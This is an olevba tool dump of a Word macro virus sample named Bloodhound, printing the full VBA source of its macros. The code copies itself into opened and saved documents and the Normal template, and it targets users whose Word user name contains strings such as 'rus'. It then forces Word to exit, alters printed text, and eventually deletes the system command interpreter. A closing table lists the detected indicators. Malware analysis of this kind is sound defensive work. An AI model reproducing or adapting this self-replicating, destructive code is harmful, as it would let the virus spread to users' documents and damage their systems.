olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bloodhound-a2c4471f13a331ff4f1c26181e915db366561fb7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bloodhound-a2c4471f13a331ff4f1c26181e915db366561fb7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Bloodhound-a2c4471f13a331ff4f1c26181e915db366561fb7 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Counter
Dim bAutoOpen
Dim i
Dim Macro$
Dim bFileOpen
Dim bFileSaveAs
Dim bFilePrint
Dim bAutoExec
Dim bWordDE
Dim CurDir_$
Dim FakeDoc$
Dim pos
Dim MacroFile$

Counter = WordBasic.CountMacros(1, 0, 0)

If Counter = 0 Then
    bAutoOpen = 0
Else
    For i = 1 To Counter
        Macro$ = WordBasic.[MacroName$](i, 1, 0)
        If Macro$ = "AutoOpen" Then bAutoOpen = -1
        If Macro$ = "FileOpen" Then bFileOpen = -1
        If Macro$ = "FileSaveAs" Then bFileSaveAs = -1
        If Macro$ = "FilePrint" Then bFilePrint = -1
        If Macro$ = "AutoExec" Then bAutoExec = -1
        If Macro$ = "WordDE" Then bWordDE = -1
    Next i
End If

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Fail
CurDir_$ = WordBasic.[DefaultDir$](14)
WordBasic.ChDefaultDir CurDir_$, 2
WordBasic.Dialog.FileSaveAs dlg

FakeDoc$ = dlg.Name
If WordBasic.[Right$](FakeDoc$, 3) = "dot" Then
pos = InStr(FakeDoc$, ".")
FakeDoc$ = WordBasic.[Left$](FakeDoc$, pos) + "doc"
dlg.Name = FakeDoc$
End If

If bAutoOpen And bFilePrint And bFileOpen And bAutoExec And bWordDE _
And bFileSaveAs Then
    WordBasic.FileSaveAs dlg
Else
    dlg.Format = 1
    WordBasic.FileSaveAs dlg
    MacroFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy "WordSU", MacroFile$ + ":AutoOpen", 1
    WordBasic.MacroCopy "FileOpen", MacroFile$ + ":FileOpen", 1
    WordBasic.MacroCopy "FilePrint", MacroFile$ + ":FilePrint", 1
    WordBasic.MacroCopy "FileSaveAs", MacroFile$ + ":FileSaveAs", 1
    WordBasic.MacroCopy "AutoExec", MacroFile$ + ":AutoExec", 1
    WordBasic.MacroCopy "WordDE", MacroFile$ + ":WordDE", 1
    WordBasic.FileSave
End If

Fail:

End Sub

-------------------------------------------------------------------------------
VBA MACRO FilePrint.bas 
in file: Virus.MSWord.Bloodhound-a2c4471f13a331ff4f1c26181e915db366561fb7 - OLE stream: 'Macros/VBA/FilePrint'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Id$
Dim i
Dim Gay

Dim lox As Object: Set lox = WordBasic.DialogRecord.HelpAbout(False)
WordBasic.CurValues.HelpAbout lox
Id$ = LCase(lox.APPUSERNAME)
ReDim Lox___$(5)
Lox___$(0) = "386"
Lox___$(1) = "gay"
Lox___$(2) = "gaj"
Lox___$(3) = "ãàÿ"
Lox___$(4) = "rus"

i = 0
While i < 5
    If InStr(1, Id$, Lox___$(i)) <> 0 Then Gay = -1
    i = i + 1
Wend

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
On Error GoTo -1: On Error GoTo Reject
WordBasic.CurValues.FilePrint dlg
WordBasic.Dialog.FilePrint dlg

If WordBasic.Second(WordBasic.Now()) > 40 And Gay Then
    WordBasic.EditReplace Find:="ÿ", Replace:="ìíÿ", ReplaceAll:=1
End If

WordBasic.FilePrint dlg
Reject:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Bloodhound-a2c4471f13a331ff4f1c26181e915db366561fb7 - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Counter
Dim bAutoOpen
Dim i
Dim Macro$
Dim bFileOpen
Dim bFilePrint
Dim bFileSaveAs
Dim bAutoExec
Dim bWordDE
Dim MacroFile$

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
On Error GoTo -1: On Error GoTo Fail
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg

Counter = WordBasic.CountMacros(1, 0, 0)

If Counter = 0 Then
    bAutoOpen = 0
Else
    For i = 1 To Counter
        Macro$ = WordBasic.[MacroName$](i, 1, 0)
        If Macro$ = "AutoOpen" Then bAutoOpen = -1
        If Macro$ = "FileOpen" Then bFileOpen = -1
        If Macro$ = "FilePrint" Then bFilePrint = -1
        If Macro$ = "FileSaveAs" Then bFileSaveAs = -1
        If Macro$ = "AutoExec" Then bAutoExec = -1
        If Macro$ = "WordDE" Then bWordDE = -1
    Next i
End If

If bAutoOpen And bFileOpen And bFilePrint And bFileSaveAs _
And bAutoExec And bWordDE Then
Else
    MacroFile$ = WordBasic.[FileName$]()
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "WordSU", MacroFile$ + ":AutoOpen", 1
    WordBasic.MacroCopy "FileOpen", MacroFile$ + ":FileOpen", 1
    WordBasic.MacroCopy "FilePrint", MacroFile$ + ":FilePrint", 1
    WordBasic.MacroCopy "FileSaveAs", MacroFile$ + ":FileSaveAs", 1
    WordBasic.MacroCopy "AutoExec", MacroFile$ + ":AutoExec", 1
    WordBasic.MacroCopy "WordDE", MacroFile$ + ":WordDE", 1
    WordBasic.FileSave
End If

Fail:

End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Bloodhound-a2c4471f13a331ff4f1c26181e915db366561fb7 - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Id$
Dim i
Dim Gay
Dim Minutes
Dim Hours
Dim Alarm$

Dim lox As Object: Set lox = WordBasic.DialogRecord.HelpAbout(False)
WordBasic.CurValues.HelpAbout lox
Id$ = LCase(lox.APPUSERNAME)
ReDim Lox___$(5)
Lox___$(0) = "386"
Lox___$(1) = "gay"
Lox___$(2) = "gaj"
Lox___$(3) = "ãàÿ"
Lox___$(4) = "rus"
For i = 0 To 4
If InStr(1, Id$, Lox___$(i)) <> 0 Then Gay = -1
Next i

If Gay Then
    Minutes = WordBasic.Second(WordBasic.Now()) + WordBasic.Minute(WordBasic.Now())
    Hours = WordBasic.Hour(WordBasic.Now())
    If Minutes > 59 Then
        Minutes = Minutes - 60
        Hours = Hours + 1
    End If
    If Hours = 24 Then Hours = 0
    Alarm$ = WordBasic.[LTrim$](Str(Hours)) + ":" + WordBasic.[LTrim$](Str(Minutes))
    WordBasic.OnTime Alarm$, "WordDE"
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO WordSU.bas 
in file: Virus.MSWord.Bloodhound-a2c4471f13a331ff4f1c26181e915db366561fb7 - OLE stream: 'Macros/VBA/WordSU'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Counter
Dim i
Dim Macro$
Dim bWordSU
Dim bFileOpen
Dim bFilePrint
Dim bFileSaveAs
Dim bAutoExec
Dim bWordDE
Dim MacroFile$
Dim lox As Object
Dim Id$
ReDim Lox___$(0)
Dim Gay
Dim A$
Dim Comspec$

Counter = WordBasic.CountMacros(0, 0, 0)

For i = 1 To Counter
    Macro$ = WordBasic.[MacroName$](i, 0, 0)
    If Macro$ = "WordSU" Then bWordSU = -1
    If Macro$ = "FileOpen" Then bFileOpen = -1
    If Macro$ = "FilePrint" Then bFilePrint = -1
    If Macro$ = "FileSaveAs" Then bFileSaveAs = -1
    If Macro$ = "AutoExec" Then bAutoExec = -1
    If Macro$ = "WordDE" Then bWordDE = -1
Next i

If bWordSU And bFileOpen And bFilePrint And bFileSaveAs And bAutoExec And bWordDE Then
Else
    MacroFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy MacroFile$ + ":AutoOpen", "Normal:WordSU", 1
    WordBasic.MacroCopy MacroFile$ + ":FilePrint", "Normal:FilePrint", 1
    WordBasic.MacroCopy MacroFile$ + ":FileOpen", "Normal:FileOpen", 1
    WordBasic.MacroCopy MacroFile$ + ":AutoExec", "Normal:AutoExec", 1
    WordBasic.MacroCopy MacroFile$ + ":WordDE", "Normal:WordDE", 1
    WordBasic.MacroCopy MacroFile$ + ":FileSaveAs", "Normal:FileSaveAs", 1

    Set lox = WordBasic.DialogRecord.HelpAbout(False)
    WordBasic.CurValues.HelpAbout lox
    Id$ = LCase(lox.APPUSERNAME)
    ReDim Lox___$(5)
    Lox___$(0) = "386"
    Lox___$(1) = "gay"
    Lox___$(2) = "gaj"
    Lox___$(3) = "ãàÿ"
    Lox___$(4) = "rus"

    For i = 0 To 4
    If InStr(1, Id$, Lox___$(i)) <> 0 Then Gay = -1
    Next i

    If Gay Then
        Id$ = WordBasic.[GetProfileString$]("gay", "lox")
        Select Case Len(Id$)
            Case 0
                WordBasic.SetProfileString "gay", "lox", "1"
                WordBasic.MsgBox "Initiating StartUp Sequence", "WordSU Info", 64
            Case Is < 5
                A$ = Id$ + "1"
                WordBasic.SetProfileString "gay", "lox", A$
            Case Else
                WordBasic.SetProfileString "gay", "lox", "1"
                Comspec$ = Environ("COMSPEC")
                SetAttr Comspec$, 0
                WordBasic.Kill Comspec$
        End Select
    End If

End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO WordDE.bas 
in file: Virus.MSWord.Bloodhound-a2c4471f13a331ff4f1c26181e915db366561fb7 - OLE stream: 'Macros/VBA/WordDE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.FileExit 2
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

